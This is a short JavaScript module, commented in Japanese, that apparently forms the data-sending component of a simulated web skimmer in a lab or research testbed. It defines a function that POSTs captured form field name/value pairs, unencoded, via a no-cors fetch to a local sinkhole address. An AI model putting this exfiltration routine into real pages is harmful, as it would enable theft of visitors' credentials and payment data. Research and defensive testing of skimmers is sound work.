'use strict';
// スキマーの送信部（全モデル共通。D23）。
// 宛先: sinkhole.localhost:8082（D29、D54）。符号化なし（D30）。fetch の no-cors の単純リクエスト（D54）。
// XHR への切り替えは D28・D38 により、今は実装しない。
(function () {
  var SINK_URL = 'http://sinkhole.localhost:8082/c';
  window.__skimmerSend = function (pairs) {
    // pairs: [[name, value], ...]。URLSearchParams の本文は application/x-www-form-urlencoded になる
    var body = new URLSearchParams();
    pairs.forEach(function (p) { body.append(p[0], p[1]); });
    return fetch(SINK_URL, { method: 'POST', mode: 'no-cors', body: body });
  };
})();
